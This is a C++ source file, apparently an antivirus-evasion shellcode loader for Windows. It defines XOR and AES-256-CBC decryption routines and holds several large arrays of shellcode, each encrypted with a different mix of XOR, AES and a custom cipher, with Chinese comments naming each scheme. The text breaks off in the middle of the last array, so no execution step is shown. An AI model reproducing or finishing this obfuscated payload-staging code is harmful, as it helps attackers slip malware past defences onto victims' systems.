#include <Windows.h>
#include <iostream>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>

#include <iostream>
#include <iomanip>
#include <cstring>
#include <vector>

#include "selfdefencrypt.h"
using namespace std;

// Decrypt the shellcode (XOR decryption)
void XOR_Decrypt(BYTE* encryptedShellcode, BYTE* decryptedShellcode, size_t length, BYTE key = 0xAA) {
    for (size_t i = 0; i < length; ++i) {
        decryptedShellcode[i] = encryptedShellcode[i] ^ key;
    }
}


void AES_Decrypt(const unsigned char* ciphertext, size_t ciphertext_len,
    const unsigned char* key, const unsigned char* iv, unsigned char* decrypted) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();  // 创建 EVP 上下文
    if (ctx == NULL) {
        std::cerr << "Error creating EVP_CIPHER_CTX" << std::endl;
        return;
    }

    // 初始化解密操作，使用 AES-256 CBC
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
        std::cerr << "Error initializing decryption" << std::endl;
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    int len;
    int decrypted_len;

    // 执行解密操作

    if (EVP_DecryptUpdate(ctx, decrypted, &len, ciphertext, ciphertext_len) != 1) {
        std::cerr << "Error during decryption" << std::endl;
        EVP_CIPHER_CTX_free(ctx);
        return;
    }
    decrypted_len = len;

    // 完成解密操作
    if (EVP_DecryptFinal_ex(ctx, decrypted + len, &len) != 1) {
        std::cerr << "Error finalizing decryption" << std::endl;
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    // 释放 EVP 上下文
    EVP_CIPHER_CTX_free(ctx);
}





int main() {
    // Encrypted shellcode (XOR encrypted as an example)
    //XOR加密后的shellcode
    //BYTE encryptedShellcode[] = { 0x56, 0xE2, 0x29, 0x4E, 0x5A, 0x42, 0x66, 0xAA, 0xAA, 0xAA, 0xEB, 0xFB, 0xEB, 0xFA, 0xF8, 0xFB, 0xE2, 0x9B, 0x78, 0xFC, 0xCF, 0xE2, 0x21, 0xF8, 0xCA, 0xE2, 0x21, 0xF8, 0xB2, 0xE2, 0x21, 0xF8, 0x8A, 0xE7, 0x9B, 0x63, 0xE2, 0x21, 0xD8, 0xFA, 0xE2, 0xA5, 0x1D, 0xE0, 0xE0, 0xE2, 0x9B, 0x6A, 0x06, 0x96, 0xCB, 0xD6, 0xA8, 0x86, 0x8A, 0xEB, 0x6B, 0x63, 0xA7, 0xEB, 0xAB, 0x6B, 0x48, 0x47, 0xF8, 0xEB, 0xFB, 0xE2, 0x21, 0xF8, 0x8A, 0x21, 0xE8, 0x96, 0xE2, 0xAB, 0x7A, 0xCC, 0x2B, 0xD2, 0xB2, 0xA1, 0xA8, 0xA5, 0x2F, 0xD8, 0xAA, 0xAA, 0xAA, 0x21, 0x2A, 0x22, 0xAA, 0xAA, 0xAA, 0xE2, 0x2F, 0x6A, 0xDE, 0xCD, 0xE2, 0xAB, 0x7A, 0x21, 0xE2, 0xB2, 0xEE, 0x21, 0xEA, 0x8A, 0xE3, 0xAB, 0x7A, 0xFA, 0x49, 0xFC, 0xE7, 0x9B, 0x63, 0xE2, 0x55, 0x63, 0xEB, 0x21, 0x9E, 0x22, 0xE2, 0xAB, 0x7C, 0xE2, 0x9B, 0x6A, 0xEB, 0x6B, 0x63, 0xA7, 0x06, 0xEB, 0xAB, 0x6B, 0x92, 0x4A, 0xDF, 0x5B, 0xE6, 0xA9, 0xE6, 0x8E, 0xA2, 0xEF, 0x93, 0x7B, 0xDF, 0x72, 0xF2, 0xEE, 0x21, 0xEA, 0x8E, 0xE3, 0xAB, 0x7A, 0xCC, 0xEB, 0x21, 0xA6, 0xE2, 0xEE, 0x21, 0xEA, 0xB6, 0xE3, 0xAB, 0x7A, 0xEB, 0x21, 0xAE, 0x22, 0xEB, 0xF2, 0xEB, 0xF2, 0xF4, 0xF3, 0xE2, 0xAB, 0x7A, 0xF0, 0xEB, 0xF2, 0xEB, 0xF3, 0xEB, 0xF0, 0xE2, 0x29, 0x46, 0x8A, 0xEB, 0xF8, 0x55, 0x4A, 0xF2, 0xEB, 0xF3, 0xF0, 0xE2, 0x21, 0xB8, 0x43, 0xE1, 0x55, 0x55, 0x55, 0xF7, 0xE3, 0x14, 0xDD, 0xD9, 0x98, 0xF5, 0x99, 0x98, 0xAA, 0xAA, 0xEB, 0xFC, 0xE3, 0x23, 0x4C, 0xE2, 0x2B, 0x46, 0x0A, 0xAB, 0xAA, 0xAA, 0xE3, 0x23, 0x4F, 0xE3, 0x16, 0xA8, 0xAA, 0xB4, 0xCB, 0xCF, 0x2F, 0x32, 0x1A, 0xEB, 0xFE, 0xE3, 0x23, 0x4E, 0xE6, 0x23, 0x5B, 0xEB, 0x10, 0xE6, 0xDD, 0x8C, 0xAD, 0x55, 0x7F, 0xE6, 0x23, 0x40, 0xC2, 0xAB, 0xAB, 0xAA, 0xAA, 0xF3, 0xEB, 0x10, 0x83, 0x2A, 0xC1, 0xAA, 0x55, 0x7F, 0xC0, 0xA0, 0xEB, 0xF4, 0xFA, 0xFA, 0xE7, 0x9B, 0x63, 0xE7, 0x9B, 0x6A, 0xE2, 0x55, 0x6A, 0xE2, 0x23, 0x68, 0xE2, 0x55, 0x6A, 0xE2, 0x23, 0x6B, 0xEB, 0x10, 0x40, 0xA5, 0x75, 0x4A, 0x55, 0x7F, 0xE2, 0x23, 0x6D, 0xC0, 0xBA, 0xEB, 0xF2, 0xE6, 0x23, 0x48, 0xE2, 0x23, 0x53, 0xEB, 0x10, 0x33, 0x0F, 0xDE, 0xCB, 0x55, 0x7F, 0x2F, 0x6A, 0xDE, 0xA0, 0xE3, 0x55, 0x64, 0xDF, 0x4F, 0x42, 0x39, 0xAA, 0xAA, 0xAA, 0xE2, 0x29, 0x46, 0xBA, 0xE2, 0x23, 0x48, 0xE7, 0x9B, 0x63, 0xC0, 0xAE, 0xEB, 0xF2, 0xE2, 0x23, 0x53, 0xEB, 0x10, 0xA8, 0x73, 0x62, 0xF5, 0x55, 0x7F, 0x29, 0x52, 0xAA, 0xD4, 0xFF, 0xE2, 0x29, 0x6E, 0x8A, 0xF4, 0x23, 0x5C, 0xC0, 0xEA, 0xEB, 0xF3, 0xC2, 0xAA, 0xBA, 0xAA, 0xAA, 0xEB, 0xF2, 0xE2, 0x23, 0x58, 0xE2, 0x9B, 0x63, 0xEB, 0x10, 0xF2, 0x0E, 0xF9, 0x4F, 0x55, 0x7F, 0xE2, 0x23, 0x69, 0xE3, 0x23, 0x6D, 0xE7, 0x9B, 0x63, 0xE3, 0x23, 0x5A, 0xE2, 0x23, 0x70, 0xE2, 0x23, 0x53, 0xEB, 0x10, 0xA8, 0x73, 0x62, 0xF5, 0x55, 0x7F, 0x29, 0x52, 0xAA, 0xD7, 0x82, 0xF2, 0xEB, 0xFD, 0xF3, 0xC2, 0xAA, 0xEA, 0xAA, 0xAA, 0xEB, 0xF2, 0xC0, 0xAA, 0xF0, 0xEB, 0x10, 0xA1, 0x85, 0xA5, 0x9A, 0x55, 0x7F, 0xFD, 0xF3, 0xEB, 0x10, 0xDF, 0xC4, 0xE7, 0xCB, 0x55, 0x7F, 0xE3, 0x55, 0x64, 0x43, 0x96, 0x55, 0x55, 0x55, 0xE2, 0xAB, 0x69, 0xE2, 0x83, 0x6C, 0xE2, 0x2F, 0x5C, 0xDF, 0x1E, 0xEB, 0x55, 0x4D, 0xF2, 0xC0, 0xAA, 0xF3, 0xE3, 0x6D, 0x68, 0x5A, 0x1F, 0x08, 0xFC, 0x55, 0x7F };
    //AES加密后的shellcode
    //BYTE encryptedShellcode[] = { 0xDF, 0xE7, 0xE9, 0x2D, 0x9D, 0xCF, 0x2B, 0x09, 0xA3, 0xFD, 0xFF, 0xBA, 0xE2, 0x20, 0xED, 0xE5, 0x25, 0x89, 0x57, 0x06, 0x30, 0x6C, 0xBA, 0xF6, 0x81, 0xC7, 0xD4, 0x8A, 0xF9, 0x5E, 0x59, 0x3B, 0x10, 0x69, 0x91, 0x1D, 0x5F, 0x0E, 0x78, 0x77, 0xEF, 0x20, 0x0E, 0x14, 0x0C, 0xFC, 0xCC, 0x88, 0xFE, 0x3D, 0xC5, 0x6F, 0x9D, 0x18, 0xF1, 0x41, 0x7F, 0xAD, 0x7D, 0x61, 0x34, 0xC6, 0xAB, 0xE0, 0x34, 0x1A, 0xF6, 0xA9, 0x13, 0x67, 0x6C, 0x39, 0xCE, 0x53, 0xC9, 0x7A, 0x50, 0xB8, 0x16, 0xEC, 0xD2, 0x12, 0xD5, 0xF9, 0xAA, 0x70, 0x87, 0xE1, 0x0F, 0x2F, 0x71, 0xA9, 0x4C, 0xCE, 0x65, 0xDC, 0xE3, 0xFE, 0x99, 0x47, 0x4F, 0x5F, 0x35, 0x36, 0xCA, 0x9A, 0xD9, 0x27, 0x00, 0xDC, 0x21, 0xF0, 0xC6, 0x4E, 0x10, 0xEB, 0xC2, 0x4F, 0x35, 0x49, 0x7D, 0xA4, 0xF3, 0x2A, 0x79, 0x5C, 0x19, 0x03, 0xAB, 0x8B, 0xF6, 0xD0, 0x7A, 0x2B, 0xD5, 0xC8, 0xA4, 0x47, 0x47, 0x92, 0x42, 0x6A, 0x1B, 0x77, 0xDB, 0xFC, 0x71, 0xBA, 0x57, 0xCE, 0x68, 0x68, 0xCC, 0x55, 0x6F, 0x90, 0xF4, 0x79, 0x3F, 0xB8, 0x57, 0xC9, 0x30, 0x48, 0x76, 0x05, 0x6A, 0x75, 0x5F, 0x39, 0xD8, 0x54, 0x7C, 0x7F, 0xDA, 0x37, 0x51, 0x1B, 0x73, 0xBB, 0xAA, 0x91, 0x25, 0xF5, 0x4A, 0xA7, 0xE4, 0xAD, 0xAB, 0x2C, 0x26, 0x11, 0x8C, 0x9B, 0x3F, 0x64, 0x1C, 0x10, 0xE6, 0x55, 0x9B, 0x2C, 0x42, 0x90, 0xAF, 0x52, 0x90, 0x4A, 0x6E, 0x0B, 0xD2, 0xEF, 0x74, 0x73, 0xE5, 0xDD, 0xC4, 0x4E, 0x0B, 0xC1, 0xC9, 0x95, 0x34, 0xEA, 0x33, 0xE9, 0x09, 0xFC, 0xF8, 0xCB, 0x94, 0xCA, 0xBE, 0x65, 0xDC, 0x9E, 0x34, 0xF2, 0x9A, 0xA5, 0x8B, 0x47, 0x2A, 0x53, 0x0C, 0x8F, 0x85, 0x55, 0x6D, 0xAB, 0x42, 0xB2, 0x93, 0xCB, 0x6C, 0xA6, 0xAD, 0xF8, 0xF5, 0x34, 0x60, 0x16, 0x7B, 0xC7, 0x53, 0x36, 0x37, 0xA5, 0x4F, 0x8E, 0x78, 0x67, 0x11, 0x1E, 0xD5, 0xF8, 0xFF, 0x21, 0x8A, 0x37, 0x3E, 0x55, 0xCA, 0xE5, 0x3E, 0x57, 0x12, 0x39, 0x90, 0x22, 0x06, 0x8F, 0x1F, 0xAE, 0x75, 0x16, 0x1F, 0xA0, 0xB8, 0x2D, 0x66, 0x20, 0x91, 0x2C, 0x44, 0xDD, 0x48, 0xFA, 0x44, 0x7A, 0x82, 0x79, 0x28, 0x7A, 0x3C, 0x62, 0x30, 0x06, 0xCC, 0x68, 0x5B, 0x3E, 0xE5, 0xE5, 0x3D, 0x7C, 0x96, 0xFF, 0x7C, 0x0A, 0x3A, 0xAB, 0x54, 0x2F, 0xDA, 0x96, 0x80, 0x94, 0x59, 0xA6, 0x61, 0x60, 0xB8, 0x87, 0x22, 0xC3, 0xEF, 0x2D, 0x5F, 0xF1, 0x80, 0xBA, 0x50, 0xFA, 0x1B, 0xDE, 0xEA, 0x81, 0x47, 0x9C, 0x03, 0x51, 0xAB, 0xD5, 0xAD, 0x1D, 0xF0, 0xEB, 0x29, 0x60, 0x6A, 0xBF, 0x5E, 0xE3, 0xEB, 0xF8, 0x3A, 0xDE, 0xD1, 0x90, 0x6E, 0xB6, 0xB0, 0x7D, 0x5E, 0xD3, 0x92, 0x41, 0xC0, 0xFA, 0x78, 0xC2, 0x3C, 0x6B, 0x88, 0xBB, 0x9E, 0xBB, 0x7F, 0x15, 0x20, 0xD7, 0x20, 0x73, 0x31, 0x79, 0x7F, 0x22, 0xBF, 0xE7, 0x87, 0x29, 0x61, 0x7A, 0xBC, 0xD1, 0xF1, 0x7B, 0x95, 0xEC, 0xEA, 0x96, 0x67, 0xD3, 0x6A, 0xCD, 0x6B, 0x5A, 0xD8, 0xA3, 0xAC, 0xC8, 0xB9, 0x53, 0xCD, 0x92, 0x29, 0xC9, 0x7F, 0x56, 0xC4, 0x3E, 0xDB, 0xAD, 0xB3, 0xFB, 0xCD, 0x83, 0x0E, 0xBD, 0x95, 0xC4, 0x56, 0x69, 0xAC, 0x7D, 0xA5, 0xF1, 0x3D, 0x28, 0xF9, 0x84, 0xFD, 0x36, 0x3B, 0x7D, 0x67, 0x03, 0xCD, 0x2D, 0x51, 0xD7, 0x12, 0x57, 0xFF, 0x67, 0x2E, 0xD9, 0x1B, 0x4B, 0xC3, 0xF4, 0xB9, 0xB9, 0x5B, 0xD8, 0xD9, 0xD1, 0xF8, 0x7A, 0x42, 0xDB, 0x00, 0x03, 0x26, 0x1A, 0xA6, 0x7B, 0x84, 0x59, 0x9D, 0x76, 0xB5, 0x28, 0x81, 0xA7, 0xED, 0x1B, 0xAD, 0x19, 0xDD, 0x6D };

    //先XOR后AES加密
    // BYTE encryptedShellcode[] = { 0x9E, 0xCE, 0x64, 0x73, 0x25, 0x62, 0x1F, 0xB5, 0xF6, 0xF3, 0xA0, 0xB1, 0x47, 0xFC, 0x8A, 0x3B, 0xBF, 0xD7, 0x55, 0x9C, 0x5C, 0x04, 0x9D, 0xE0, 0x32, 0x5D, 0x39, 0x18, 0x62, 0x5F, 0x5A, 0x9B, 0xFB, 0xEE, 0x05, 0xBD, 0xA5, 0xE5, 0xF7, 0xF8, 0x7A, 0x9C, 0x68, 0xB3, 0xC9, 0x7C, 0xBF, 0x54, 0xFB, 0x81, 0x78, 0x1F, 0x41, 0x33, 0xD8, 0x1A, 0x08, 0xEF, 0xC2, 0xDA, 0x7F, 0x04, 0x10, 0x82, 0xAB, 0xB1, 0x1E, 0xDC, 0x98, 0x8A, 0x18, 0xEA, 0x08, 0x7C, 0x19, 0x10, 0x89, 0x1E, 0xCC, 0xDC, 0xF8, 0xD5, 0x61, 0x57, 0xF5, 0x39, 0xCD, 0x79, 0xE7, 0xB7, 0xDC, 0x92, 0xEC, 0x27, 0xF0, 0x33, 0x76, 0xD9, 0x9D, 0x6A, 0x0F, 0xF4, 0x8C, 0x9E, 0x8C, 0xAF, 0xF9, 0xD0, 0x84, 0xA9, 0x77, 0x04, 0xFE, 0x25, 0x33, 0x42, 0x9D, 0xB2, 0xC4, 0x0F, 0x4E, 0xCA, 0x97, 0x99, 0xBD, 0x15, 0xB9, 0xFF, 0x90, 0xE8, 0x33, 0xD3, 0x3B, 0x8C, 0x50, 0x73, 0xDD, 0x71, 0xFD, 0xAC, 0xB1, 0xB1, 0xA1, 0xEE, 0x65, 0x65, 0x0D, 0x55, 0xCB, 0x96, 0x27, 0xE5, 0xA2, 0x60, 0x64, 0x37, 0x29, 0x8E, 0x07, 0xC6, 0x84, 0xF3, 0x1B, 0xD2, 0x55, 0x3C, 0x72, 0xD6, 0xBA, 0xF3, 0x8A, 0x86, 0x17, 0xE2, 0xA0, 0x5D, 0x28, 0xE6, 0x98, 0x16, 0xAF, 0xE9, 0xE7, 0xD7, 0xFC, 0x94, 0x18, 0xFE, 0x62, 0x3D, 0x55, 0x52, 0x1D, 0x1B, 0x8B, 0xC3, 0x12, 0xBC, 0x2A, 0x7F, 0x3F, 0x09, 0xB5, 0x05, 0xC1, 0x6B, 0x73, 0x39, 0xAE, 0xF3, 0x7C, 0x34, 0x81, 0xAE, 0x68, 0x3D, 0x19, 0x34, 0x91, 0x3C, 0xE3, 0xAC, 0xB1, 0x97, 0xA7, 0x8D, 0xC3, 0x0F, 0xAD, 0xFD, 0xFB, 0x66, 0x14, 0xD1, 0x53, 0x06, 0x06, 0x87, 0x01, 0x24, 0xD3, 0x76, 0x12, 0xF2, 0x1C, 0x8F, 0x0F, 0x3A, 0x15, 0x03, 0xF1, 0xE7, 0xF6, 0x47, 0x20, 0xFE, 0xEB, 0xB5, 0x03, 0xB0, 0x74, 0x1D, 0x3C, 0x56, 0x57, 0x4D, 0xBB, 0x0B, 0xAD, 0xDA, 0x83, 0x75, 0x9D, 0xB7, 0x9E, 0xDA, 0x03, 0x9F, 0x50, 0x77, 0x8A, 0xBD, 0x59, 0x6E, 0x2E, 0x2F, 0x38, 0x8C, 0x0C, 0xA2, 0xF1, 0x25, 0xA1, 0x90, 0xFB, 0xD6, 0x69, 0x67, 0xBC, 0xEE, 0x87, 0x70, 0x79, 0x93, 0x1D, 0x45, 0xF6, 0xA6, 0x19, 0x25, 0x9A, 0x06, 0xAD, 0xD1, 0x7F, 0x59, 0xD3, 0x12, 0x67, 0x38, 0xDB, 0x74, 0xBD, 0x3F, 0x18, 0x81, 0x3A, 0xB5, 0xF8, 0xBC, 0xF3, 0x04, 0x38, 0x6E, 0xCD, 0x79, 0x5B, 0x02, 0x89, 0x58, 0xEB, 0x35, 0xB8, 0xCD, 0xCA, 0xD2, 0x55, 0x6B, 0x0E, 0x4F, 0x2C, 0x34, 0x81, 0x93, 0xC8, 0x39, 0xA2, 0x3D, 0x96, 0x34, 0x02, 0x48, 0x93, 0x15, 0x01, 0x68, 0x19, 0x93, 0x6E, 0x58, 0x14, 0x5C, 0xD0, 0x11, 0x75, 0x81, 0x87, 0x90, 0xF6, 0x0F, 0x66, 0xFB, 0x7D, 0x95, 0x19, 0x33, 0x33, 0x5F, 0x8C, 0x18, 0x91, 0xBC, 0xE0, 0x75, 0xFB, 0xB3, 0x3E, 0x64, 0xBC, 0x76, 0x27, 0x06, 0x39, 0xF0, 0xB7, 0x40, 0x75, 0x4A, 0xA6, 0x22, 0x3C, 0x31, 0x83, 0x2D, 0x9D, 0x7C, 0xA1, 0x39, 0x46, 0x6E, 0xE4, 0x02, 0xE0, 0x5F, 0xD6, 0x83, 0x29, 0x8E, 0xD3, 0xB5, 0x63, 0xFE, 0x7F, 0x90, 0x3E, 0xD2, 0x5E, 0xFB, 0xF8, 0x69, 0x29, 0xBF, 0xAC, 0xE8, 0xA5, 0x2D, 0x87, 0x05, 0xC6, 0x4B, 0x11, 0x17, 0xA9, 0xBA, 0xB0, 0xDF, 0xAD, 0x28, 0x63, 0x1D, 0xF7, 0x9A, 0x9C, 0x68, 0xBC, 0x06, 0x64, 0x1C, 0xBE, 0xBC, 0xF4, 0x54, 0x45, 0x74, 0x3D, 0x19, 0xBE, 0x88, 0x59, 0xE1, 0x5C, 0xD6, 0x4F, 0xF0, 0xC6, 0xCF, 0x0E, 0x71, 0xDA, 0x56, 0xB3, 0xC1, 0x09, 0x5C, 0xD8, 0x0D, 0xF0, 0xF5, 0x21, 0x6C, 0x97, 0xCF, 0xDA, 0xD5, 0x22, 0xC2, 0x9B, 0xA3, 0xB6, 0xEF, 0x9A, 0xEC };

    //XOR->AES->Self后的shellcode
    //BYTE encryptedShellcode[] = {0x8C, 0xFC, 0xAB, 0x5E, 0x20, 0x71, 0x21, 0x57, 0x2B, 0x44, 0xBD, 0x2A, 0x66, 0x0F, 0x43, 0xD8, 0x3F, 0xB7, 0x46, 0x01, 0xBE, 0x06, 0x6A, 0x99, 0x59, 0x10, 0x52, 0x15, 0x97, 0x20, 0x63, 0xC8, 0x6C, 0x03, 0x79, 0x91, 0x31, 0xF1, 0xF2, 0x9F, 0x46, 0xA8, 0xEB, 0xC2, 0xE6, 0xC5, 0x2E, 0xB7, 0xAD, 0x03, 0x57, 0x72, 0x6B, 0x6D, 0x88, 0x12, 0x47, 0x22, 0x48, 0xC0, 0xBE, 0x77, 0x80, 0x7A, 0xBD, 0x93, 0x86, 0x7C, 0xD8, 0xD2, 0xF8, 0x52, 0xE6, 0x22, 0x7A, 0xB5, 0x7C, 0x85, 0x86, 0x56, 0x81, 0xF2, 0xBF, 0xCD, 0x15, 0x61, 0x55, 0xA9, 0x5F, 0x6F, 0x30, 0x86, 0xAF, 0x36, 0x6B, 0x9A, 0x75, 0xC4, 0x78, 0x99, 0x0E, 0x27, 0xFC, 0x16, 0x07, 0x16, 0x3A, 0xD5, 0x65, 0x3E, 0xBE, 0x1F, 0x71, 0x9C, 0x40, 0x6B, 0x90, 0x99, 0x27, 0x7E, 0x18, 0x0C, 0x35, 0xFF, 0xC1, 0x79, 0xF7, 0x95, 0x42, 0xFA, 0x4B, 0x6B, 0x16, 0x43, 0xAB, 0xBA, 0x7D, 0xD9, 0xF6, 0xB9, 0xBD, 0xBD, 0x6C, 0x0D, 0xB1, 0xB1, 0x01, 0xE9, 0xA4, 0x73, 0x31, 0xAF, 0xEA, 0x60, 0xDF, 0x5E, 0x4C, 0xE5, 0xB4, 0xCF, 0x2B, 0x3E, 0x70, 0xE3, 0xA6, 0x01, 0xE4, 0x50, 0x2B, 0xE8, 0x74, 0xD8, 0xA0, 0x7F, 0x59, 0x2A, 0x14, 0x82, 0x24, 0xD2, 0xA5, 0x07, 0x3F, 0x6F, 0x6E, 0x66, 0x9C, 0x52, 0xF9, 0x20, 0xF0, 0x01, 0xE3, 0x19, 0x1B, 0x33, 0x26, 0xB0, 0x77, 0x38, 0x05, 0x37, 0x91, 0x21, 0x53, 0xED, 0x15, 0xAB, 0x2B, 0x2C, 0x4E, 0xE6, 0x2C, 0xAD, 0xF9, 0xC2, 0x4E, 0xB5, 0xA6, 0xDD, 0xF6, 0xFB, 0xFF, 0xBD, 0x69, 0x2F, 0x27, 0x1B, 0xB9, 0xC9, 0x94, 0x03, 0x1D, 0xEE, 0xF4, 0xCB, 0x4F, 0xF4, 0x1E, 0x2D, 0xC4, 0x4B, 0xD0, 0xB0, 0xA7, 0xC6, 0x68, 0x27, 0x5B, 0xC1, 0x6F, 0xFD, 0x0F, 0x44, 0x9C, 0xAA, 0x21, 0xD3, 0x5A, 0x5B, 0x19, 0x8E, 0x64, 0xA6, 0x29, 0xBF, 0xB3, 0xC3, 0x48, 0xC9, 0xE1, 0xDB, 0x5F, 0x99, 0x48, 0xFC, 0xD7, 0x5B, 0x1F, 0xBA, 0x79, 0xD8, 0xEC, 0xF5, 0x87, 0xAC, 0x16, 0x32, 0x60, 0x96, 0x71, 0xFD, 0xFA, 0x0D, 0xE4, 0x03, 0xEF, 0x25, 0x6C, 0x26, 0x1A, 0x4F, 0x0B, 0x55, 0xD1, 0x19, 0xD4, 0x44, 0x71, 0xB5, 0xF4, 0x08, 0x1D, 0xC9, 0xF5, 0x77, 0xB0, 0x4B, 0x32, 0xEF, 0x8E, 0xA3, 0x37, 0x79, 0xAD, 0x52, 0x21, 0x68, 0x26, 0xF2, 0xBE, 0x2B, 0xEC, 0x32, 0x55, 0xA9, 0x00, 0x23, 0x92, 0x85, 0xA1, 0xD3, 0xA9, 0xB2, 0x70, 0x18, 0x53, 0x01, 0x67, 0xCC, 0x4E, 0x76, 0x0B, 0xAD, 0x15, 0xE2, 0xF9, 0x60, 0x4E, 0xA4, 0x62, 0x00, 0xC1, 0x0B, 0xC2, 0x2D, 0x0B, 0xB5, 0x92, 0xEC, 0x06, 0xEE, 0x5D, 0x3A, 0xAD, 0xE1, 0xFA, 0x4F, 0x27, 0x44, 0x03, 0x94, 0x41, 0x39, 0x6B, 0xB5, 0x97, 0x6B, 0x52, 0x16, 0x26, 0xDD, 0xE1, 0x6A, 0xEB, 0x03, 0x5E, 0xDC, 0xC4, 0x26, 0xF4, 0xAF, 0x9A, 0x15, 0x0A, 0x5F, 0x98, 0xE1, 0xE0, 0xD4, 0x3D, 0xA6, 0x49, 0xDB, 0xE6, 0x99, 0x15, 0x0D, 0xEC, 0x34, 0x00, 0xDE, 0x97, 0x6A, 0xDB, 0xE4, 0x4C, 0xE5, 0x21, 0x4B, 0x9C, 0x7B, 0xFA, 0x77, 0x70, 0xDC, 0x03, 0xBC, 0x25, 0xF2, 0xB7, 0xE5, 0x42, 0xF6, 0x49, 0xF1, 0x91, 0x4F, 0xF3, 0xB4, 0x7F, 0x5D, 0xE8, 0x65, 0x17, 0x5A, 0x82, 0xC9, 0x19, 0x7B, 0x08, 0x9F, 0xC2, 0x46, 0xF4, 0x26, 0xC6, 0x5E, 0x26, 0x5C, 0x2E, 0x0E, 0x8E, 0xD1, 0xB5, 0xF9, 0xA2, 0x5C, 0x4D, 0xF5, 0xE4, 0x06, 0x9A, 0x67, 0xE7, 0xB4, 0x7D, 0xCC, 0x64, 0x48, 0xED, 0xEB, 0x06, 0x05, 0xE9, 0x12, 0x61, 0x9A, 0xB6, 0x8D, 0xE7, 0xFF, 0x81, 0x48, 0xC0, 0xE0, 0xBB, 0x63, 0x47, 0x04, 0x36, 0x08};

    //XOR->Self->AES
    BYTE encryptedShellcode[] = { 0x38, 0x0C, 0x7D, 0xC6, 0x33, 0xC4, 0xF5, 0x7E, 0xEF, 0x44, 0xD9, 0xEF, 0x55, 0x64, 0xB7, 0x2B, 0x16, 0xB7, 0x90, 0xC6, 0xD4, 0x61, 0x15, 0x5F, 0x66, 0xA9, 0x16, 0xAF, 0x75, 0x64, 0xE0, 0x7A, 0xB6, 0xFC, 0x4B, 0x4A, 0xE4, 0x25, 0xC1, 0x64, 0x91, 0x05, 0x25, 0x69, 0xB9, 0x65, 0x00, 0x73, 0x0A, 0x70, 0xCA, 0xB1, 0x35, 0x4F, 0x76, 0xB9, 0x8C, 0x0C, 0x8C, 0x20, 0x24, 0xEF, 0xBF, 0xEB, 0xEC, 0x7C, 0x1E, 0x14, 0x24, 0x00, 0xC4, 0xDB, 0x39, 0xC6, 0xFF, 0xE9, 0xB4, 0x85, 0xD8, 0xCF, 0xD3, 0xFD, 0xFD, 0x1A, 0xEA, 0xBA, 0x49, 0xFB, 0x5F, 0x2A, 0x7C, 0x05, 0xCB, 0x46, 0x45, 0xF0, 0xB6, 0xCB, 0xCA, 0x19, 0x6C, 0x39, 0x11, 0xA4, 0xB5, 0x78, 0x68, 0xA1, 0x49, 0x33, 0x27, 0x05, 0x5C, 0x47, 0xDC, 0xC9, 0x2C, 0x64, 0xD9, 0xD9, 0xA5, 0x23, 0x27, 0x3E, 0xEB, 0xD1, 0xBD, 0x29, 0x7E, 0xBE, 0xBC, 0x9A, 0xFC, 0xB4, 0x82, 0xDD, 0xF1, 0x17, 0xBC, 0xE0, 0x04, 0x7F, 0x9E, 0x78, 0x3E, 0x39, 0x2D, 0x78, 0x39, 0xC3, 0xFC, 0x4C, 0x8F, 0x50, 0xEB, 0x08, 0x54, 0x04, 0xC4, 0xE5, 0x06, 0x21, 0xF0, 0x28, 0x4D, 0xB2, 0x13, 0xD2, 0x49, 0x14, 0xA3, 0x69, 0x1E, 0x10, 0xD6, 0xEF, 0x00, 0x68, 0xDB, 0x7B, 0xB0, 0x5B, 0xDA, 0xD6, 0xFA, 0xBE, 0x22, 0xF1, 0x6E, 0x41, 0x43, 0x4E, 0x34, 0xDC, 0xF1, 0x07, 0x15, 0xBC, 0xE0, 0x7A, 0xA2, 0xC5, 0x97, 0x82, 0xBD, 0x1E, 0x5A, 0x61, 0x00, 0xC0, 0x42, 0x86, 0xC3, 0x42, 0x17, 0xC9, 0x8C, 0xE8, 0xC5, 0x8B, 0x3E, 0x75, 0xEE, 0xA0, 0xA8, 0xF0, 0x2C, 0x49, 0x32, 0x50, 0x4F, 0x93, 0xA0, 0xD2, 0x5A, 0xE8, 0xC2, 0x8F, 0x31, 0xA2, 0x61, 0x79, 0xC3, 0xF1, 0x89, 0x6F, 0x5E, 0xCD, 0x38, 0x69, 0xB5, 0x17, 0xC0, 0x8F, 0xA1, 0x43, 0x81, 0xFD, 0x08, 0x3E, 0x12, 0xD6, 0xD6, 0xE7, 0xD5, 0x8F, 0x6B, 0x93, 0x29, 0xA7, 0x43, 0x17, 0x60, 0x9B, 0x5B, 0xA1, 0x3B, 0x6C, 0x1E, 0xEC, 0x8A, 0x3B, 0x16, 0x1B, 0x40, 0x71, 0x07, 0xD7, 0x89, 0xDA, 0x25, 0x80, 0x18, 0xA9, 0xF9, 0x66, 0xAB, 0x6D, 0xBA, 0xAB, 0xF3, 0xBA, 0x05, 0x75, 0x41, 0xD3, 0xB8, 0xD0, 0x1F, 0x26, 0x59, 0x65, 0xED, 0x6A, 0x5C, 0xB3, 0xE9, 0x46, 0x37, 0x9F, 0x0A, 0xE0, 0xE1, 0xDB, 0x72, 0xBA, 0x05, 0x36, 0x2F, 0xBD, 0x17, 0x90, 0xE2, 0xFF, 0x4F, 0x18, 0xBC, 0xAE, 0x77, 0xB0, 0x5C, 0xA0, 0x40, 0xF6, 0xBB, 0xD6, 0x79, 0xBD, 0x18, 0xC3, 0x6B, 0x51, 0x7B, 0x86, 0xC0, 0xEA, 0x64, 0x9E, 0x43, 0xCE, 0x99, 0x86, 0xF1, 0x8E, 0x56, 0xEF, 0x38, 0xF7, 0x22, 0xA3, 0x53, 0x27, 0x71, 0x3C, 0x71, 0xA5, 0xCC, 0x66, 0x62, 0xA7, 0x76, 0x31, 0xD7, 0x96, 0x40, 0x64, 0x16, 0x2A, 0xFB, 0xDA, 0x87, 0x9D, 0x17, 0x37, 0xC4, 0x6A, 0xCF, 0x33, 0x86, 0x9A, 0x5D, 0x70, 0xA3, 0x81, 0xCC, 0xBD, 0x5F, 0x75, 0x5A, 0x0D, 0x2B, 0xB3, 0xD6, 0x62, 0x03, 0x85, 0xBE, 0x44, 0xC4, 0x60, 0x06, 0x2E, 0x44, 0x06, 0x1C, 0xAF, 0xD6, 0xF9, 0x23, 0xF8, 0x93, 0x8F, 0xA2, 0x48, 0x82, 0xC9, 0x88, 0xC8, 0xBA, 